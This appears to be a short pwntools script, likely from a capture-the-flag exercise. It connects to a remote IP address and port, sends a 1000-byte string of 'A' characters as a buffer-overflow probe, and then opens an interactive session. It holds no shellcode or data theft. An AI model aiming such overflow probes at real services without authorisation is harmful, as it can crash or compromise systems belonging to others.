import pwn

r = pwn.remote("124.16.75.117", 51001)

payload = b"A" * 1000

r.sendline(payload)

r.interactive()
